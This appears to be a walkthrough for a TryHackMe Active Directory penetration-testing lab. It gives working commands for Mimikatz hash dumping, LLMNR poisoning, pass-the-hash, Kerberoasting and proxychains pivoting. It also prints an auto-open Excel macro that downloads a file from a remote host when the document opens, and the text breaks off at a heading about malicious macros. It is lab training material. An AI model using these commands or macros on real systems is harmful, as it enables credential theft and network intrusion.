# TryHackMe-Throwback

## Introduction

### What is Active Directory

Active Directory is a collection of machines and servers connected inside of domains, that are a collective part of a bigger forest of domains, that make up the Active Directory network. Active Directory contains many functioning bits and pieces, a majority of which we will be covering in the upcoming tasks. To outline what we'll be covering take a look over this list of Active Directory components and become familiar with the various pieces of Active Directory: 

-   Domain Controllers
-   Forests, Trees, Domains
-   Users + Groups 
-   Trusts
-   Policies 
-   Domain Services

All of these parts of Active Directory come together to make a big network of machines and servers. Now that we know what Active Directory is, let's talk about the why.

 
### Domain Controllers 

﻿A domain controller is a Windows server that has Active Directory Domain Services (AD DS) installed and has been promoted to a domain controller in the forest. Domain controllers are the center of Active Directory -- they control the rest of the domain. I will outline the tasks of a domain controller below: 

-   holds the AD DS data store 
-   handles authentication and authorization services 
-   replicate updates from other domain controllers in the forest
-   Allows admin access to manage domain resources

  ### AD DS Data Store

The Active Directory Data Store holds the databases and processes needed to store and manage directory information such as users, groups, and services. Below is an outline of some of the contents and characteristics of the AD DS Data Store:

-   Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users
-   Stored by default in %SystemRoot%\\NTDS
-   accessible only by the domain controller

That is everything that you need to know in terms of physical and on-premise Active Directory. Now move on to learn about the software and infrastructure behind the network.

 ### Forest Overview 

 ﻿A forest is a collection of one or more domain trees inside of an Active Directory network. It is what categorizes the parts of the network as a whole.

The Forest consists of these parts which we will go into farther detail with later:

-   Trees - A hierarchy of domains in Active Directory Domain Services
-   Domains - Used to group and manage objects 
-   Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
-   Trusts - Allows users to access resources in other domains
-   Objects - users, groups, printers, computers, shares
-   Domain Services - DNS Server, LLMNR, IPv6
-   Domain Schema - Rules for object creation
  

![](https://i.imgur.com/EZawnqU.png)

_Active Directory forest visualized_


### Users Overview  

﻿Users are the core to Active Directory; without users why have Active Directory in the first place? There are four main types of users you'll find in an Active Directory network; however, there can be more depending on how a company manages the permissions of its users. The four types of users are: 

-   Domain Admins - This is the big boss: they control the domains and are the only ones with access to the domain controller.
-   Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account
-   Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller
-   Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization.

  ### Domain Policies Overview  

Policies are a very big part of Active Directory, they dictate how the server operates and what rules it will and will not follow. You can think of domain policies like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a whole. They simply act as a rulebook for Active  Directory that a domain admin can modify and alter as they deem necessary to keep the network running smoothly and securely. Along with the very long list of default domain policies, domain admins can choose to add in their own policies not already on the domain controller, for example: if you wanted to disable windows defender across all machines on the domain you could create a new group policy object to disable Windows Defender. The options for domain policies are almost endless and are a big factor for attackers when enumerating an Active Directory network. I'll outline just a few of the  many policies that are default or you can create in an Active Directory environment: 

-   Disable Windows Defender - Disables windows defender across all machine on the domain
-   Digitally Sign Communication (Always) - Can disable or enable SMB signing on the domain controller

  

![](https://cdn.pixabay.com/photo/2015/12/08/01/04/bookshelf-1082309_960_720.jpg)  

  ### Domain Services Overview 

Domain Services are exactly what they sound like. They are services that the domain controller provides to the rest of the domain or tree. There is a wide range of various services that can be added to a domain controller; however, in this room we'll only be going over the default services that come when you set up a Windows server as a domain controller. Outlined below are the default domain services: 

-   LDAP - Lightweight Directory Access Protocol; provides communication between applications and directory services
-   Certificate Services - allows the domain controller to create, validate, and revoke public key certificates
-   DNS, LLMNR, NBT-NS - Domain Name Services for identifying IP hostnames

  
### Domain Authentication Overview

The most important part of Active Directory -- as well as the most vulnerable part of Active Directory -- is the authentication protocols set in place. There are two main types of authentication in place for Active Directory: NTLM and Kerberos. Since these will be covered in more depth in later rooms we will not be covering past the very basics needed to understand how they apply to Active Directory as a whole. For more information on NTLM and Kerberos check out the Attacking Kerberos room - [https://tryhackme.com/room/attackingkerberos](https://tryhackme.com/room/attackingkerberos).

-   Kerberos - The default authentication service for Active Directory uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain.
-   NTLM - default Windows authentication protocol uses an encrypted challenge/response protocol

The Active Directory domain services are the main access point for attackers and contain some of the most vulnerable protocols for Active Directory, this will not be the last time you see them mentioned in terms of Active Directory security.


## Introduction to Offensive Powershell

Well we have all this information now how can we apply it to attacking a windows network? We can utilize offensive powershell to enumerate and attack Windows and Windows Active Directory.

### Basic Offensive Powershell

A majority of offensive Powershell will come from using Modules like ActiveDirectory and PowerView to enumerate and exploit however powershell also has a few cmdlets that you can use to your offensively.

### Using Modules in Powershell

Powershell has the ability to import modules such as ActiveDirectory and PowerView to expand the list of cmdlets available. To import a module you can either use `Import-Module module` or you can use `dot space dot backslash `(. .\\Module).

### Examples of importing modules

    `Import-Module Module`

    `. .\Module.ps1`    

Note: . .\\ will only work with powershell script files. All other modules will need to be imported with Import-Module for example ActiveDirectory can only be imported with Import-Module.

### Get-ADDomain

Get-ADDomain is a commandlet that pulls a large majority of the information about the Domain you’re attacking. It can list all of the Domain Controllers for a given environment, tell you the NetBIOS Domain name, the FQDN (Fully Qualified Domain name) and much more. Using the Select-Object command, we can filter out some of the unnecessary objects that may be displayed (like COntainers, Group Policy Objects, and much more)

`Get-ADDomain | Select-Object NetBIOSName, DNSRoot, InfrastructureMaster`

![](https://lh5.googleusercontent.com/OrunExFiNVNFaA2TzppxJH6yHkdl7vh48A3BfP2PgRwQZ9Xm_HviGFiA1w0RmTtRm0mIHxFIttx-wlbj-rPo4drXnRE3asxT0Et8jsjT5LZZ2buuO7KzInv7gthNjjVf24uJLJUT)

### Get-ADForest

Get-ADForest is another commandlet that pulls all the Domains within a Forest and lists them out to the user. This may be useful if a bidirectional trust is setup, it may allow you to gain a foothold in another domain on the LAN. Just like Get-ADDomain, there is a lot of output, so we will be using Select-Object to trim the output down.

`Get-ADForest | Select-Object Domains`

![](https://lh5.googleusercontent.com/dhr4aGFw7SGNwglBqqsmwUioztAQFpzkL4pnG0o4XK15i5PbyreXGb7XKJdtLxmuYyaNXxlqCttyazX4NFEm7dhC4dJSIV1fCEKInk9wfyiF_1S2WCnQ6rf_Lj1CERXnjPk2pGmR)

### Get-ADTrust 

Get-ADTrust is the last built in Powershell commandlet that we will be discussing, after this, we will move over to Powerview. Get-ADTrust provides a ton of information about the Trusts within the AD Domain. It can tell you if it’s a one way or bidirectional trust, who the source is, who the target is, and much more. One required field is -Filter, this is required in the event that you want to filter on a specific Domain/Trust, if you do not (like in most circumstances), you can simply provide a \* to wildcard the results.

`Get-ADTrust -Filter * | Select-Object Direction,Source,Target`

![](https://lh6.googleusercontent.com/37fYFeIDpRHLsu1aOs_STiSHzOEQ5nycTJhEka3BtOHMl_rEKj7qEq1RVYAfGK3_G-x2XQzsmQ5nn4vdaEfnwMLR7W46Ev73C09g-qupHtRSsdqc5xx3SBCLK2rnZ66Z8WoYPHfR)

### Introduction to PowerView

Powerview (part of [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) by PowerShellMafia) is an excellent suite of tools that can be used for enumeration, and exploitation of an AD Domain, today we’re only going to cover Powerview’s ability to enumerate information about the domain and their associated trusts, you can get the .ps1 [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

 
### Get-NetDomain

Get-NetDomain is similar to the ActiveDirectory module’s Get-ADDomain but contains a lot less information, which can be better. Basic info such as the Forest, Domain Controllers, and Domain Name are enumerated.  

`Get-NetDomain`

![](https://lh5.googleusercontent.com/yDWhonk4DDqcFJFKzyRnpoe_jrl71Y1ife7VZh6I4JZgKUMtU22pLA3g4nI4YU9cDns7eZZ4KvvQTMmMVvoDmVVrbR7Mwd118pnmAKZ2TAPyDsQKY7xnJvS80-t4lxdd80fkt6YY)  

### Get-NetDomainController  

Get-NetDomainController is another useful cmdlet that will list all of the Domain Controllers within the network. This is incredibly useful for initial reconnaissance, especially if you do not have a Windows device that’s joined to the domain.

`Get-NetDomainController`    

![](https://lh3.googleusercontent.com/GBxS_yOs7tODxodB17Dt-QAyOm9H0uMevU1Vrp0jByHn_RLbPp_WdzDJVfgikFuJ9Tp3_IJ9BcejrKJLL1e_Rr411a0R91gYvoG2XKACMSLe79AZVFUq8GXgspMJToJvNfhCYspY)

### Get-NetForest

Get-NetForest is similar to Get-ADForest, and provides similar output. It provides all the associated Domains, the root domain, as well as the Domain Controllers for the root domain.  

`Get-NetForest`    
  
![](https://lh5.googleusercontent.com/x8RHkDDTJzn-EPlSRwRek1Z4C5EbwIJyF5LUq4GGk8Q3BUYNj1tPdm1U3R3_9wLT_y7ecbW1qc-fqKEMBFTWF1wM_W23sCi8zCsA3uw7ZUzCBgRliMlTfhN_cyT2pJrMlBq-65J2)

### Get-NetDomainTrust 

Get-NetDomainTrust is similar to Get-ADTrust with our SelectObject filter applied to it. It’s short, sweet and to the point!

`Get-NetDomainTrust`


![](https://lh4.googleusercontent.com/9T4F84u3L5krUcyZjNw7pBGrh5B7M1pp5103UdAsGhzR72eecguoYwkCfZKY82VDYXpuCN0sSHcr5lyQwA923g5TT0zpiz_Z0Q4Z85uRhpyfV50xmjPOCvxOFdw97qwQToLr7ktc)


## LLMNR/NBT-NS Overview - 

To fully understand how the LLMNR poisoning attack works we first need to understand how LLMNR and NBT-NS work and why they are a part of Windows active directory. The Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Windows domain services that act as an alternative method for host identification. You can think of LLMNR like DNS: it allows hosts on the same network to use name resolution for other hosts. NBT-NS is used to identify systems on a network by their NetBIOS name.

## LLMNR Poisoning Overview - 

 You can spoof the source for name resolution on a victim network using responder, a tool used to respond to LLMNR and NBT-NS requests acting as though you know the identity of the host. "Poisoning" the service so that the victims will communicate with our machine. If the host belongs to a resource that requires identification the user and their NTLMv2 hash will be sent to the attacker. These hashes can then be collected from responder and taken offline to be cracked and then used to access the poisoned user's machines or can be taken into PSExec to get a shell.


### Mimikatz Overview

Mimikatz is one of the most famous tools used for dumping passwords on Windows systems. It can be used to dump passwords on both a Windows Server and mainstream Windows versions. However, with its fame, it's patterns are incredibly recognizable and are almost immediately picked up by all Anti-Virus or Anti-Malware services. So you must disable endpoint protection before attempting to use Mimikatz or utilize an obfuscated version mimikatz with a C2. Mimikatz has many modules available and is being actively supported and updated. Here is the list of supported modules

-   log
-   privilege
-   sekurlsa
-   lsadump
-   crypto
-   vault
-   token
-   misc
-   and many more

We will only be utilizing four of the modules for the lab, privilege, token, lsadump, and sekurlsa; however, mimikatz has a lot more modules and can be used more extensively.

  

### Gaining Privilege

Once endpoint protection is disabled, you'll then be able to launch Mimikatz (with an Administrative Level User), you'll want to type privilege::debug which will then put you in Debug mode, a mode that can only be granted by an Administrator. From there, we will want to elevate privileges to NT Authority (if you don't have it already) with token::elevate. This will grant you the highest level access that Microsoft has to offer, which will allow you to do basically anything on the system. It's close to the Root user account in Linux.

1.) `privilege::debug`

2.) `token::elevate`


![](https://i.imgur.com/I7d4nH8.png)  

Checking privileges  and elevating privileges with mimikatz

### Dumping Password Hashes

Mimikatz has a few options for dumping password hashes on Non-DC Endpoints well only be covering a few of the many commands and modules Mimikatz has. Mimikatz has a general template syntax most commands have the Mimikatz module first, followed by two colons, the command to be run, and any parameters that need to be specified at the end. for example

`lsadump::lsa /patch`

   lsadump is the mimikatz module itself

   lsa is the command within the module

   /patch is a specific parameter to patch something in this case a particular dll

`sekurlsa::tickets /export`

   sekurlsa is the mimikatz module

   tickets is the command withing the module

   /export is the parameter to export the tickets to the host  

  

### Dumping from LSA

The LSA (Local Security Authority) also handles credentials used by the system, from everything to basic password changes to creation of access tokens, it's another ideal candidate for us to dump hashes from. The output is not as large as lsadump::lsa which makes it much easier to work with.

1.) `lsadump::lsa /patch`    

  

![](https://lh6.googleusercontent.com/m6jT-s03DqKsMlVl7mkzWmE6vFLFIgHkyRVTdyPoO3dGwfcizyxbFzfPYIKDHqFOJojvCZCfW1IwzI6ohYOnwgRr7vG01t6axswcA8UaM_o9fG1qLXv7uG_KNxPtm90_YsGFmF-9)


 
### Dumping SAM Hashes

The SAM (Security Account Manager) holds a copy of all the user's passwords which makes it a valuable file for us to dump. The output can be convoluted and large, so you should transport it onto your Kali machine for further analysis.

1.) `lsadump::sam`

 
![](https://lh6.googleusercontent.com/_Pym2bIubeEttdqWuC0wDP4W_eRltnNzxRi_86V7uMfN22O3vXNDDZc9rmI4R1-t8DaUMj3Yf2qtTJ1w7JUAti6f-9D1eHMzeBBMn0-aqAuK2_9PnhWnRrvNMhagIOyehBwdhLQd)  

_Dumping SAM hashes with mimikatz_

  

Dumping Creds from Logged In Users

Another method of attacking lsass through Mimikatz is with the sekurlsa module. It will attempt to retrieve the credentials/hashes of currently logged in users. This being the least preferred method for dumping credentials in Mimikatz.

1.) `sekurlsa::logonPasswords`

![](https://lh6.googleusercontent.com/fZtc97fBgfo68NUEkOo4U37UyQU3kDvDglvG423Yityv0RDj2q654Q8PLHUJqFZUx6HEaAi4BzdRNhCRIRsNhylX4htT22YHvV03AjYk6RoWmIozlKg6Agnr6aaFC9Z0nTh8zZqN)  


## Pivoting Overview  

In a good network, often referred to as a “Segmented Network” there are certain rules in place preventing users from accessing certain parts of the Internal LAN (ex. The Workstation Subnet should not be able to access the Server Subnet). This can be a headache for Pentesters on occasion as most networks are not segmented, these networks are referred to as “Flat Networks”. To make Segmented Networks more like flat networks there are a proxying tools such as Proxychains or SSHuttle which make it incredibly easy to pivot from one subnet in a LAN to another. Metasploit offers a Proxy server as part of its Post Exploitation tool suite which will be covered below.

## Introduction to Pivoting with proxychains

Auto-Routing our Traffic

To setup a proxy server you will need a meterpreter session or a reverse shell open in metasploit before hand. You can easily get a meterpreter shell by uploading a payload to the machine and executing it.

1.) `background`

2.) `use post/multi/manage/autoroute`

3.) `set SESSION 1`

4.) `set SUBNET 10.200.x.0`

  

![](https://lh3.googleusercontent.com/4M_KchhIxo31nLzi0bCx5g1lkCta2bNi2gj8wpSkmb2hIOhjDKYOoiCw79XqySZDZoOeXMwOsvuW31ZvGH7bPiFV-YVXzx9SEJB-j-S27ELIEtc09HWAqQ8CO45u9-G9h-MV5m0L)  

_Listing the configured options for autoroute_

5.) `exploit`


![](https://lh3.googleusercontent.com/oA-5EI8HTNwultwzQp81foQvfbLez9Vu7RXC8tek7DGmTm5aaYONk-qXhG1VlaILGVgNuCTgZBWlB5UtauFHKp3J6u3A5wM-Vggavd7DO74BGaA0-NOs8UfmczLxT_refzoVEjHd)  

_Launching our new autoroute_

### Setting up our Proxy with Metasploit

1.) `use auxiliary/server/socks4a`

2.) (optional) Change you port, you can either keep the default 1080 port or change it to an open port of your choice.

 
### Configuring and Using the Proxy Chain 

1.) sudo `nano /etc/proxychains.conf`

You will need to comment out the socks4 proxy on 9050 which is a default proxy for tor and add the proxy chain we just created with the port that you gave when creating the proxies.  

![](https://lh6.googleusercontent.com/MeJSMszQhe8jnqKkBVSxF5Etrd7ZWhyOlSM1SpaqdJgeNGxegjQXNkFUrUUeeqjoczJUJc9kAC-ch0JLoktDvBklL9OQAvyIaU2MN9xsskU16VvhKPI5_n2RLhbegbvlKtFmxIlz)

Adding our Socks4a server to the proxychains configuration file

  

2.) `proxychains <command>`    

You can now run any normal commands or tools that you want and it will be forwarded through the proxy chain if you append your tool or command with “proxychains”.

  

![](https://lh4.googleusercontent.com/X8lnxhrYsKgEx9doBrftdW2U2gdHZqirh2KunB1CnBYpW8S1mzW217rPWHIiQ7Z03-iR6_UVirR6Bpu3ADtpnfXgr4ILKHVSSNHbd5yDmfnnXRriUehqrs0Zj6ANUwxfhibmdHAQ)

An example of running a command through proxy chains


### Pivoting with proxychains  

Pivoting may seem like a very big and scary thing but it is actually fairly simple after you have your proxy server set up. After setting up the proxy server you can pivot to any machines or resources that the proxy server has access to. For example if you had a proxy server on example-ws01 and example-ws02 was segmented by a security groups that made it so only example-ws01 had access you could use your proxy server on example-ws01 to access example-ws02. You can use any way of accessing the machine that you would usually like ssh, rdp, win-rm, psexec you just have to prepend the command with proxychains.

### Examples of pivoting

   1.) `proxychains ssh user@MACHINE_IP`

   2.) `proxychains xfreerdp /u:user /p:password /v:MACHINE_IP`

   3.) `proxychains evil-winrm -i MACHINE_IP -u user -p password`    

  

### Setting up a Web Proxy with FoxyProxy

Now that we have a proxy setup to forward our traffic through we need a way to easily access the resources on the network. Let's add an extension to our web browser to allow us to easily route our traffic through it! For this room, we'll be using 'FoxyProxy Standard' on firefox. Navigate to the following link to install FoxyProxy Standard: [Link](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)

![](https://www.notion.so/image/https%3A%2F%2Fi.imgur.com%2FkiMG1am.png?table=block&id=c39e2ea2-59f7-4c96-9b3c-3ecf842722c2&cache=v2)

_FoxyProxy Standard install card_

1.) Click on FoxyProxy among your extensions. After that, click on 'Options', Then click on 'Add'.


![](https://i.imgur.com/oyTx3NY.png)  

_FoxyProxy Options Panel_

 
2.) Enter in the following setting you will need to fill in the title, proxy type (SOCKS4), Proxy IP, and Port then click 'Save'.   

  

![](https://i.imgur.com/y6vec0d.png)  

_FoxyProxy add proxy menu_

_3.) Click on Foxy Proxy in your extensions and enable the web proxy._

![](https://i.imgur.com/nbspgz0.png)

_FoxyProxy enable menu_

Now that we have enumerated and attacked all initial vectors we can begin to collect the credentials that we have as well as what footholds we have on the network, to see how we could laterally move throughout the network. The first thing to do when we have credentials but don't know what to do with them is to pass the hash with them. This check each IP and validates the credentials. You will need to practice passing the hash with the hash you dumped in Task 20 as well as the hash from Task 10. 

### Pass the Hash Overview

Pass the hash (PtH) is an attack wherein we can leverage found NTLM or LanMan hashes of user passwords in order to successfully authenticate as the user they belong to. This is possible due to well-intentioned security ‘feature’ within Windows where passwords, prior to being sent over the network, are hashed in a predictable manner. Done originally with the intent of avoidance of password disclosure, we can leverage this feature to capture and replay hashes, allowing us to authenticate as our victim users. In this section, we’ll dig into this further with the tool crackmapexec.

## Installing crackmapexec

1.) `sudo apt install crackmapexec`    

_Note: We have received reports that the latest version of CrackMapExec segfaults, we recommend using a prior version like [5.0.2dev](https://github.com/byt3bl33d3r/CrackMapExec/releases/tag/v5.0.2dev) until further updates are released._

  

![](https://lh4.googleusercontent.com/_Jj_9mrDkd9u6-CDAAl6PaC02NibDLA7FlPIWb4OJmI0s1gH0wB6-sl29sFqXlzHjK082xa4p2CD5huYqojPpGjgxZmfEn6539GZ6Pv-_tmjuAqckIMBRUTbku2WVercOW9kDZX-)

Crackmapexec help menu


### Conquering Hashes with crackmapexec

1.) Configure proxychains to the proxy server that will be sending your requests. You will need a proxy server to pivot to the other machines and bypass segmentation. You can also utilize sshuttle as a proxy server to pivot.

2.) `proxychains crackmapexec smb 10.200.x.0/24 -u <user> -d <domain> -H <hash>`    

![](https://lh3.googleusercontent.com/bcWDpt4Vjk7YhxhmT9nUrYPaC548q1LWqMiZMBDr21EJU1jwn9l88VPOHTRmoYHpeTEHNqmCMdg88rkPlLLWMmVeO6o-2KWmk1PtTreug1EE3xA0Hy5g8IWNgOjFC5fIFzlD59kq)

_Success! We got a hit passing the hash!_

To continue on you can either use the hashes from mimikatz or cracked passwords from Task 10 to pass the hash then access the device(s). To access the device(s) you can either use the hashes with evil-winrm or you can attempt to crack the hashes and use ssh or rdp.

## Enumeration with Bloodhound  

Bloodhound is a graphical interface that allows you to visually map out the network using database visualization from neo4j. Bloodhound along with Sharphound or any bloodhound ingestor takes the user, groups, trusts and more of a domain and collects them into .json files and created a graphical database in neo4j to view information of the network. 

Well be focusing on how to collect the .json files and import them into Bloodhound, then make basic and custom queries in neo4j

  

![](https://lh5.googleusercontent.com/CLFBzoQpFo86808hm62n5IKuCjGh2o3sejXE66VOeYVt--QBqrqdW4ngU5VyN6x5FD8tROUQHtvtCME9TMK9yiU0kcsYPHIugsL8zj9o9HpuGgzIfg-HjN3RVREZxitpWbKaLuXe)

  

## Bloodhound Installation

1.) `sudo apt install bloodhound` 

2.) `neo4j console`

### default credentials:

    `user:neo4j`

    `pass:neo4j`    

### Getting Loot with Sharphound

You will need to download Sharphound [here](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors). We suggest downloading the .ps1 script file.

From your host machine

1.) `python3 -m http.server`    

From the target device

2.) `wget tun0_IP:8000/Sharphound.ps1 -outfile Sharphound.ps1`    

3.) `powershell -ep bypass`

4.) `. .\Sharphound.ps1`

    or 

    `Import-Module .\Sharphound.ps1`    

5.) `Invoke-Bloodhound -CollectionMethod All -Domain THROWBACK.local -ZipFileName loot.zip`   


![](https://lh4.googleusercontent.com/3G7PTrFXBCpL5OJxzMQFyaHyEk_l3AC9B9TJP9-P1EwHAS5I530o_km-ypIfF8Cgh6v0NsN2wdyz5rroGgumdIBaww3QBuNEGZV9E1ukQlNzD-alNLhGvL-HJJQx2gkP7_BwOiw8)

### Launching Sharphound to enumerate domain information

Mapping the Network with Bloodhound 

1.) `scp loot.zip @10.200.x.222:/Users/Administrator/Downloads/loot.zip`    

2.) `sudo neo4j console`

3.) `bloodhound`    

4.) Sign into Bloodhound using the same credentials you set with neo4j.

  

![](https://lh3.googleusercontent.com/hsfAYf396-SafBFMo8EVPTm4cc83J-UauV7aJn1Y4nW2TeupOICB_uQGYCGauCcBCSJhmIMzJuecKun5S6lrkIctmN5pWQ_SioalQFNE_WAk9i4P-W96agnwcsmkyx19vpZrdeD5)

### Bloodhound login panel

  

5.) In Bloodhound look for the 'upload data' icon / text and upload the json files / zip folder.

6.) To view the graphed network open the menu and select queries this will you a list of pre-compiled queries to choose from.


![](https://lh3.googleusercontent.com/0ayTqE2l-cV0hrfRZvb4Pl5bNRHGHD_pFSQnIGB37sNMMA5QqYT8o8IRjft79BUyboU4IU4Bj8X0YE9WrvFEiPxTBeakmUMVKWZJlbZaMASRO9ULxrYMGZNcdIThyDChej6_yeeT)

Selecting the 'Queries' sub-menu in Bloodhound


Bloodhound has many queries to utilize such as 'find all domain admins'.

![](https://lh6.googleusercontent.com/mlJ068re6A9VsWRh34eGlyy-3VyJsCvduz6mecmsPRhDgODAlYJKUOoENISgledzkKwGTxlHeFC_Dm5v1l6zn8d0_htJ7HtSH0KpU9RKlzB4p90v6J9KKiqmuxxpqISKk7neKEv4)

Results of a query of domain admins

There are many pre-built queries to utilize that can help enumerate a domain.

![](https://lh3.googleusercontent.com/41hHyy7in7wqzSUSm2AgIEawZ9b2bA255Bj40nil8eDT3-bTJWKA2W4rZ35v6ojZuM8OAkOcSFD85JnGah_7jOE5TQUR7bd-w1WOjt0HAXeNFnc7EP4SyTNd63bgxwitpGqSWBxV)

Pre-built queries within Bloodhound


## Kerberoasting Overview

 In this section, we'll be covering one of the most popular Kerberos attacks - Kerberoasting. Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is crackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts use BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast, if they are domain admins, and what kind of connections they have to the rest of the domain.

 
### Impacket Installation

Impacket releases have been unstable since 0.9.20, I suggest getting an installation of Impacket < 0.9.20

1.) `pip3 install impacket`

2.) `locate impacket`

or

1.) `cd /opt`

2.) Download the precompiled package from [https://github.com/SecureAuthCorp/impacket/releases/tag/impacket\_0\_9\_19](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19)

3.) `cd Impacket-0.9.19`

4.) `pip install .`
  

## Kerberoasting with Impacket 

1.) `cd /usr/share/doc/python3-impacket/examples`

2.) `proxychains sudo python3 GetUserSPNs.py -dc-ip 10.200.x.117 THROWBACK.local/user:password -request`    

We can use any valid set of credentials on the workstation to kerberoast with for example HumphreyW's password from pfsense or if you don't have a valid set of credentials yet you can also dump hashes with mimikatz and attempt to crack them to get a valid set of credentials.


![](https://lh4.googleusercontent.com/qQfCsjsBopDfrSh86uNdhLNzkiFaXsJsCP62ktY53esw8hTDTIRPVqjwhVAWURk4mNrNEV5A4rbcs--eca2Z_kWvO40SOPHEjTGcjXcmRWo5Xqtdg9uCiHh-gUWIsvRijQ_I2fuV)
 

Sample Output from GetUserSPNs.py


### Crack those Hashes with Hashcat

1.) `hashcat -m 13100 -a 0 hash.txt rockyou.txt`    

![](https://lh6.googleusercontent.com/p-6a5Ort2oGeaVmawYmIUO7wHYN5HP_r1yXIa81Q2aBoFPDViaM4yyD-WLPIecAnzWMuAUX5NDdYL_rgS7t3nbE__nAX6UnyN9gTujpxL3ZkJKcJuRacDcekPkcdmeulpi6LC0D5)

Sample KRB5TGS hash cracked with Hashcat



## Malicious Macros Overview

Picture this, you are a manager for one of the top accounting firms in the United States. As you walk across the floor, you notice one thing in common: Every device has the Microsoft Office suite installed. This shouldn’t be any surprise to you, as reported in Microsoft’s 2019 Annual report, Office 365 (Commercial) has 180 million users. For an attacker, this is an extremely large attack surface. As an attacker, all you need to do is get one person to click on an Excel/Office document, and they could be the downfall of an organization.  

Source: [https://www.microsoft.com/investor/reports/ar19/index.html](https://www.microsoft.com/investor/reports/ar19/index.html)


### Creating a Simple Macro

To start, you’ll want to register an account with Microsoft, then download and install Office to your lab machine.

Note: You will need a windows 10 machine for this portion of the lab if you have a windows 10 host you can utilize it or you can spin up a local vm of windows. Please do not use lab machines on the 10.200.0.0 subnet this will ruin the lab experience for others.  
  
After installed, start Excel and create a new workbook and head over to the “View” tab.

  

![](https://lh6.googleusercontent.com/-F-RP3PP0VR2dcF7RnmDoyCiTgMS-njY4UjxiTqPy5vq2qupmFA1uLABb9d7BZojudkdhGtHCF9YNZSHLmIHmZ_ayFnuCfo5LVc_jA4CprZ3mnuxUA2hhF8lDg7qt3uYuI5-dQwV)  

_Microsoft Excel with the View Tab Open_

 
Within there, you will find a section called “Macros”, Clicking the button will display a drop-down menu where you will have the option to create a new Macro. Click “Create New Macro”, you should see a new window open.

![](https://lh3.googleusercontent.com/hHJ7ZMAnyyJdTwF_WCahV_SW1iIkqz2u-Gza08ijh1c5vcL-zn9dMdOB2Hfzr-rr2X7jUXDZWZUUOOoztyQrtMI9bd7w00l0R7LE9SMZmu6j3Ezn5GIEDwdI0XnGxiTDMOTGM74_)  

  

Microsoft Excel with the Macro Creation Window Open

You can name your new Macro whatever you like. It’s important to know that later, the Macro name is not just an arbitrary value. It can add some additional functions, and do some special things that will help us later. After entering a name for the Macro, and clicking “Create” you should see a new window open that looks very different from Excel’s normal interface.

![](https://lh4.googleusercontent.com/YPFy-IvVMK7CBDHwrS4kbuNIsnEiQpP2sw0poDzDIR97VKDGWUlSgiH_LxVuXdyGSp4Gk0PbOJjwi9WfRPWmGi2T33qJy3LlXb3zJ0m3-LCCxgUT1b_EZLVEwfGbrhietDfrKMBg)

  

### Microsoft’s Visual Basic Macro Editor

This is Microsoft’s Visual Basic Macro Creator/Editor. This is where we will eventually create our Malicious Macro. Here, we can write visual basics to perform actions, even execute OS commands. For example, we can use:

PID = Shell("powershell.exe -c Invoke-WebRequest -Uri https://192.168.125.1/shadow -OutFile C:\\Shadow", vbNormalFocus)

This will connect out to a remote server and download the file “Shadow” and save it to the root of the file system as a file called “Shadow” (How creative).

  

![](https://lh6.googleusercontent.com/VxFdtX6PPyCsZJ7znIRXTplANVnuqmlMl8kjYOsA-S3jrUT_xLHF7gWVREo-hfuYzoECA779Wt_xY_ed-HHhOE_nhMcuLWtGGC_WMGC3XHfRmqN12Tkdsj_Gvqo9A8CA52OX1uBl)  

### A Python HTTP Server Listening with a Macro to Call Out to it  

Let's say we wanted to step it up a notch and require the user to not interact with the Macro to trigger the remote connection to the HTTP Server, is this possible? If so, how can we do it?

It turns out, the answer is “Yes, (onto the) Next Question” and “Very easily”. To make a Macro execute on the document opening, we can add a useful “Sub” called “Auto\_Open”. Upon document opening, whatever is in that Sub will be run, in this scenario, I’ll call the HelloWorld Sub upon document opening with the following code below.

  

![](https://lh3.googleusercontent.com/aXagHIvfltV9HbSV8Aj802G6mKSX9wRxqFV_J1DKkiCxFaCRCAII6XxleGZmWKMD-pHQDq1UrBhJMOxc4SX8LCEVC6mWBjbWaJ2UQbW68aU5qSkGwm-zio0xC4QtFemeIu8fSUI0)  

### Adding our malicious PowerShell code to the macro

  

Code Below:

  
```
Sub HelloWorld()

    PID = Shell("powershell.exe -c Invoke-WebRequest -Uri https://192.168.125.1/passwd -OutFile C:\\passwd", vbNormalFocus)

End Sub

  

Sub Auto\_Open()

    HelloWorld

End Sub
```
  

After saving this document as an xlsm (Excel Macro-Enabled Document) and upon reopening it, we should see a call out to our remote web server attempting to retrieve the file “passwd”.

  

![](https://lh6.googleusercontent.com/H4wCXMLnfohIf-h2VwG00w9IVjWZ7BLa-Sk1wgSckb9Ju72C_XdjBJ0ejfo6KHpRt3RM6EHY_yasqcuY6abS2KnKZ46Ea_fZD4ig-iYRlsSJn_sGNv1vMHLly1hDLQ9qcXsESWrc)

Microsoft Excel Prompting the User to Accept Use of Macros

  
### But what, what's this?

Microsoft has added a feature where the user must authorize Macros to be executed on the document to help protect the end-user. Fortunately, most people just don’t care and will click “Enable Content” or have the “Allow All Macros” setting enabled by default.

  
After pressing “Display Content” we can see the request come into our web server as expected:


![](https://lh5.googleusercontent.com/T47r4YFH8skHVVnXD1GIRmGBxo-ATLCrIEyt3-fZElbEqmqjfgMIRSVtOXwSGKobzQwkFnazx2YNZf1r8rgIlFdWiffNeta6RnT3scFExpBzFRrA-e1Sz_DVowCNi4AeXRsTtxcN)  


After Accepting Macros, the Macro Reaches Out to an HTTP Server

### Creating a Malicious Macro

